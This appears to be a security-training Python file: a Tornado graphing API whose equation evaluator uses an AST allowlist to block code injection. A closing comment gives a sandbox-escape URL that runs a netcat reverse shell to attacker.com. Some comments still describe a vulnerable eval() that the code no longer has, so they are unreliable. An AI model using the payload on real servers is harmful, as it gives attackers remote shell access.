import os
import math
import sqlite3
import logging
import tornado.ioloop
import tornado.web
from datetime import datetime

# Configure logging for the Mathematical Graphing Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GraphService - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TornadoGrapher")

DB_FILE = "graph_definitions.db"

def init_graph_db():
    """Initializes the SQLite database for storing saved graph definitions."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE saved_graphs (
            graph_id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            equation TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    mock_graphs = [
        ('Sine Wave', 'math.sin(x)'),
        ('Parabola', 'x**2 - 4*x + 4'),
        ('Exponential Growth', 'math.exp(x/10)')
    ]
    cursor.executemany('''
        INSERT INTO saved_graphs (title, equation)
        VALUES (?, ?)
    ''', mock_graphs)

    conn.commit()
    conn.close()
    logger.info("Graph definitions database initialized.")

def fetch_saved_graph(graph_id: int) -> dict:
    """Retrieves a saved graph definition from the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM saved_graphs WHERE graph_id = ?", (graph_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return dict(row)
    except sqlite3.Error as e:
        logger.error(f"Database error fetching graph {graph_id}: {e}")
    return {}

import ast
import math
import operator

def calculate_data_points(equation: str, start: int, end: int, step: int) -> list:
    """
    SECURE: Prevents Code Injection (CWE-94) by parsing the equation into an 
    Abstract Syntax Tree (AST) and strictly evaluating only allowed mathematical 
    operations, avoiding the dangerous eval() function.
    """
    logger.info(f"Calculating secure data points for equation: {equation}")
    data_points = []
    
    # Explicitly allowlist basic mathematical operators
    allowed_operators = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.USub: operator.neg,
        ast.UAdd: operator.pos
    }
    
    # Explicitly allowlist safe mathematical functions
    allowed_functions = {
        "sin": math.sin,
        "cos": math.cos,
        "tan": math.tan,
        "exp": math.exp,
        "sqrt": math.sqrt,
        "log": math.log,
        "log10": math.log10
    }

    def safe_eval(node, x_val):
        """Recursively walks the AST and strictly limits allowed operations."""
        if isinstance(node, ast.Expression):
            return safe_eval(node.body, x_val)
            
        elif isinstance(node, ast.Constant):  # Python 3.8+
            if isinstance(node.value, (int, float)):
                return float(node.value)
            raise ValueError("Only numeric constants are allowed.")
            
        elif isinstance(node, ast.Num):  # Fallback for Python < 3.8
            return float(node.n)
            
        elif isinstance(node, ast.Name):
            # Only the 'x' variable is permitted
            if node.id == 'x':
                return float(x_val)
            raise ValueError(f"Unknown or forbidden variable: {node.id}")
            
        elif isinstance(node, ast.BinOp):
            op_type = type(node.op)
            if op_type in allowed_operators:
                left = safe_eval(node.left, x_val)
                right = safe_eval(node.right, x_val)
                return allowed_operators[op_type](left, right)
            raise ValueError(f"Unsupported binary operator: {op_type.__name__}")
            
        elif isinstance(node, ast.UnaryOp):
            op_type = type(node.op)
            if op_type in allowed_operators:
                operand = safe_eval(node.operand, x_val)
                return allowed_operators[op_type](operand)
            raise ValueError(f"Unsupported unary operator: {op_type.__name__}")
            
        elif isinstance(node, ast.Call):
            # Handle standard function calls like sin(x) or math.sin(x)
            func_name = None
            if isinstance(node.func, ast.Attribute):
                # E.g., math.sin -> check if the base is 'math' and extract the attr 'sin'
                if isinstance(node.func.value, ast.Name) and node.func.value.id == 'math':
                    func_name = node.func.attr
            elif isinstance(node.func, ast.Name):
                func_name = node.func.id
                
            if func_name in allowed_functions:
                if len(node.args) != 1:
                    raise ValueError(f"Function '{func_name}' expects exactly 1 argument.")
                arg_val = safe_eval(node.args[0], x_val)
                return allowed_functions[func_name](arg_val)
            raise ValueError(f"Unsupported or dangerous function call: {func_name}")
            
        else:
            raise ValueError(f"Unsupported expression construct: {type(node).__name__}")

    try:
        # 1. Parse the untrusted string into an AST in 'eval' mode.
        # This acts as a parser, not an executor, neutralizing payload execution.
        tree = ast.parse(equation, mode='eval')
        
        # 2. Safely traverse the AST for each point on the graph
        for x_val in range(start, end + 1, step):
            y_val = safe_eval(tree, x_val)
            data_points.append({"x": x_val, "y": float(y_val)})
            
        return data_points
        
    except SyntaxError as e:
        logger.error(f"Syntax error in equation '{equation}': {e}")
        return []
    except ValueError as e:
        logger.error(f"Security/Validation restriction triggered: {e}")
        return []
    except ZeroDivisionError:
        logger.error(f"Division by zero attempted in equation '{equation}'.")
        return []
    except Exception as e:
        logger.error(f"Unexpected error during secure equation evaluation: {e}")
        return []

class GraphRenderHandler(tornado.web.RequestHandler):
    """Handler for rendering mathematical graphs dynamically."""
    
    def get(self):
        """
        Endpoint to process the mathematical equation and return data points.
        Query Params: equation, start, end, step
        Example: /api/graph?equation=x**2&start=0&end=10&step=1
        """
        equation = self.get_argument("equation", None)
        
        if not equation:
            self.set_status(400)
            self.write({"error": "Missing 'equation' query parameter."})
            return
            
        try:
            start = int(self.get_argument("start", "0"))
            end = int(self.get_argument("end", "10"))
            step = int(self.get_argument("step", "1"))
        except ValueError:
            self.set_status(400)
            self.write({"error": "Start, end, and step parameters must be integers."})
            return
            
        if step <= 0:
            self.set_status(400)
            self.write({"error": "Step parameter must be greater than zero."})
            return

        # Pass the untrusted string directly to the vulnerable function
        points = calculate_data_points(equation, start, end, step)
        
        if not points:
            self.set_status(500)
            self.write({"error": "Failed to calculate data points. Check equation syntax or math domain errors."})
            return
            
        self.write({
            "equation": equation,
            "data_points": points
        })

class HealthCheckHandler(tornado.web.RequestHandler):
    """Standard health check endpoint."""
    def get(self):
        self.write({"status": "Tornado Graphing Service is healthy"})

def make_app():
    """Application factory for Tornado."""
    return tornado.web.Application([
        (r"/api/health", HealthCheckHandler),
        (r"/api/graph", GraphRenderHandler),
    ])

if __name__ == "__main__":
    init_graph_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a URL with a malicious equation designed to escape the sandbox:
    #    /api/graph?equation=[c%20for%20c%20in%20().__class__.__base__.__subclasses__()%20if%20c.__name__%20==%20'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc%20-e%20/bin/sh%20attacker.com%204444')
    #
    # 2. Submitting this GET request causes eval() to execute the OS command, completely
    #    bypassing the intended mathematical calculations.
    
    app = make_app()
    port = 8082
    app.listen(port)
    logger.info(f"Starting Tornado Graphing API on http://0.0.0.0:{port}")
    
    try:
        tornado.ioloop.IOLoop.current().start()
    except KeyboardInterrupt:
        logger.info("Shutting down Graphing Service...")
